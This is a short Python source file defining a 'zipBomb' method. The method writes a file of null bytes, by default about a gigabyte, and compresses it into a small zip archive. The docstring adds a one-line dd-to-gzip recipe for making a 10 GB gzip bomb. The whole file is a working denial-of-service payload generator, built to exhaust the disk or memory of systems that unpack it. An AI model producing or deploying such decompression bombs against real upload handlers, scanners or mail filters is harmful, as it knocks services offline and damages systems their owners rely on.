#!/usr/bin/env python
# -*- coding: utf-8 -*-

import os


class Misc(object):

    def __init__(self):
        super(Misc, self).__init__()

    @staticmethod
    def zipBomb(dst="dst.zip", size=1000):
        '''
        dst: write bomb file path
        size: zip file size
        in linux, could use /dev/zero
        e.g. dd if=/dev/zero bs=1M count=10240 | gzip > 10G.gzip
        '''
        import zipfile
        z = zipfile.ZipFile(dst, "w", zipfile.ZIP_DEFLATED)
        tmp = "tmp"
        with open(tmp, "w") as f:
            for i in range(size):
                f.write("\x00" * 1024 * 1024)
        z.write(tmp)
        os.remove(tmp)
        z.close()

if __name__ == '__main__':
    Misc.zipBomb()
